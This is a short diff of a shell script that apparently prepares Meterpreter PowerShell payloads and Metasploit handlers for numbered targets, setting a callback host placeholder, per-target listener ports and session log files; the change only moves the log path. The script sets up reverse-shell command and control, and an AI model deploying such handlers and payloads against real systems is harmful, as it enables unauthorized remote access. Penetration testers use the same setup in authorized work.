@@ -13,7 +13,7 @@ LHOST="server_ip"
 LPORT=$((BASE_PORT + TARGET_NUM))  # e.g., 9000 + 1 = 9001 for target 1
 PAYLOAD_FILE="meterpreter_target_${TARGET_NUM}.ps1"
 RC_FILE="handler_target_${TARGET_NUM}.rc"
-LOG_FILE="/home/ec2-user/meterpreter_sessions_target_${TARGET_NUM}.log"
+LOG_FILE="/home/ubuntu/meterpreter_sessions_target_${TARGET_NUM}.log"
 SCREEN_NAME="msf_target_${TARGET_NUM}"
 
 # Generate the payload
